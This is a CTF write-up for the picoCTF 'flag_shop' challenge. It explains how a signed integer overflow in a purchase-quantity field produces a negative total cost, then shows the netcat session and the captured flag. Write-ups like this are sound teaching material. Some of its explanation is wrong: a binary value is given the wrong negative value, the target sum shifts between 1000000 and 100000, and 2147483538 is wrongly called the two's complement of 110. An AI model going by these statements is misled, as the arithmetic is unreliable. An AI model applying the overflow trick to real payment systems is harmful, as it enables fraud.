# flag_shop

## Description

There's a flag shop selling stuff, can you buy a flag? `Source`. Connect with `nc jupiter.challenges.picoctf.org 44566`.

## Explanation

The program allows us to buy cheap flags for 900$ of which we can afford one with our starting account balance of 1100$. When asked how many of these cheap flags we want the value is stored into a signed integer, which we can exploit to make more money. We can use the test program to illustrate what happens:

```
$ gcc -o test test.c
$ ./test
INT_MAX = 2147483647
2147483647
2147483647
$ ./test
INT_MAX = 2147483647
2147483648
-2147483648
$ ./test
INT_MAX = 2147483647
2147483649
-2147483647
$ ./test
INT_MAX = 2147483647
4294967295
-1
```

The maximum value a signed integer can hold is `2147483647` or `2^31 - 1`, in binary this would be 

```
0111 1111 1111 1111 1111 1111 1111 1111
```

If we add one to this number this will become

```
1000 0000 0000 0000 0000 0000 0000 0000
```

Which is a negative number according to signed integer rules (the MSB is the sign, 0 means positive, 1 negative). Another fact is that negative numbers are not represented the same way as positive ones in binary. For example: 

```
0000 0000 0000 0000 0000 0000 0000 0001 =  1
1000 0000 0000 0000 0000 0000 0000 0001 = -2147483648 != -1
```

The way to determine a negative number's value from binary is using two's complement. Mathematically, a negative number is the "inverse" of the respective positive number which, when added to said positive number returns the neutral element of addition, which is zero (at least when talking about integers or real numbers) 

```
3 - 3 = 3 + (-3) = 0
```

Binary subtraction in machines works similarly to this line of thinking, you take the subtrahend, "invert" it and then add it to the minuend using the same hardware circuit that you would use for addition. The inversion part is achieved by using two's complement. Two's complement can be calculated by first inverting all bits of the binary number (turning 1s to 0s and vice versa) and finally adding 1, ignoring any overflow. By that rule (in 8 bit notation) -1 can be obtained from 1 the following way:

```
0000 0001 = 1
1111 1110 -> after inverting all bits
1111 1111 = -1 after adding an additional one
```

This number represents the inverse because when adding it to the original number we get the following:

```
    0000 0001 (=  1)
+   1111 1111 (= -1)
_____________
= 1 0000 0000 (=  0)       
```

As we are talking 8-bit numbers the ninth bit represents nothing to our number system and when only looking at the last 8 bits we actually get 0, the desired result of `1 - 1`. We can proove that this always holds true for two's complement mathematically but not in this writeup. Intuitively it makes sense though, adding two numbers, one of which is the bitwise invert of the other you will always become "all ones". Adding another 1 to this result will carry all the way to the first bit and overflow however many bits you choose to work with.

So we understand two's complement and negative binary numbers now. Next we have to use it to our advantage to gain enough money to purchase the flag. We could of course smash in some large numbers (not all will work though) and see which one gives us luck but we might learn some more useful things by attemting to put in exactly the right number (or as right as it gets bcs we will be left with 100 excess dollars)

We need 1000000$ and start with 1100$ and we can gain multiples of 900$ (the price of the knockoff flags). So we want to bridge the difference between the two, which is `100000 - 1100 = 98900`. The closest multiple of 900 above that number is `99000 = 900 * 110`. So we need to enter the two's complement of 110 to achieve our ends.

```
0000 0000 0000 0000 0000 0000 0110 1110 =  110
1111 1111 1111 1111 1111 1111 1001 0010 = -110 = 2147483538
```

Now we can slap in this number and seed how it does the job:

```
$ nc jupiter.challenges.picoctf.org 44566
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483538

The final cost is: -99000

Your current balance after transaction: 100100

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
```
Awesome, this worked.